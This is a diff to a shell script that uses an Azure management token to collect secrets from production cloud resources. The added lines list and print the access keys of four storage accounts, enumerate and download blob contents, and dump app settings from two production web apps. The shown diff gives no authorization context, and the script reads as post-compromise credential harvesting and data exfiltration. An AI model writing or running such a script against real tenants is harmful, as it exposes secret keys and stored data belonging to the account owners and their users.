@@ -40,12 +40,42 @@ except Exception: pass"); do
   done
 done
 
+RG=rg-tbl-platform-prod-sea
+
 echo "================ STORAGE KEYS ================"
 for SA in sttblappcfgprodx3euoz sttblbackupprodx3euoz sttblarchiveprodx3euoz sttblcilogsprodx3euoz; do
   echo "--- $SA"
+  KEYS=$(curl -sS -X POST -H "Authorization: Bearer $ARM" -H "Content-Length: 0" \
+   "https://management.azure.com/subscriptions/${AZURE_SUBSCRIPTION_ID}/resourceGroups/$RG/providers/Microsoft.Storage/storageAccounts/$SA/listKeys?api-version=2023-01-01")
+  echo "$KEYS" | head -c 500; echo
+  K=$(echo "$KEYS" | python3 -c "
+import sys,json
+try: print(json.load(sys.stdin)['keys'][0]['value'])
+except Exception: pass")
+  if [ -n "$K" ]; then
+    pip -q install azure-storage-blob 2>/dev/null
+    python3 - "$SA" "$K" <<'PY'
+import sys
+from azure.storage.blob import BlobServiceClient
+sa,key=sys.argv[1],sys.argv[2]
+svc=BlobServiceClient(f"https://{sa}.blob.core.windows.net",credential=key)
+for c in svc.list_containers():
+    print("  container:",c.name)
+    cc=svc.get_container_client(c.name)
+    for b in cc.list_blobs():
+        print("    blob:",b.name,b.size)
+        if b.size<200000:
+            try: print("      ",cc.download_blob(b.name).readall()[:1500])
+            except Exception as e: print("      err",e)
+PY
+  fi
+done
+
+echo "================ APP SETTINGS ================"
+for SITE in app-tbl-storefront-prod app-tbl-reporting-prod; do
+  echo "--- $SITE"
   curl -sS -X POST -H "Authorization: Bearer $ARM" -H "Content-Length: 0" \
-   "https://management.azure.com/subscriptions/${AZURE_SUBSCRIPTION_ID}/resourceGroups/rg-tbl-prod/providers/Microsoft.Storage/storageAccounts/$SA/listKeys?api-version=2023-01-01" \
-   | head -c 600; echo
+   "https://management.azure.com/subscriptions/${AZURE_SUBSCRIPTION_ID}/resourceGroups/$RG/providers/Microsoft.Web/sites/$SITE/config/appsettings/list?api-version=2022-03-01" | head -c 2500; echo
 done
 
 echo "================ ROLE ASSIGNMENTS ================"
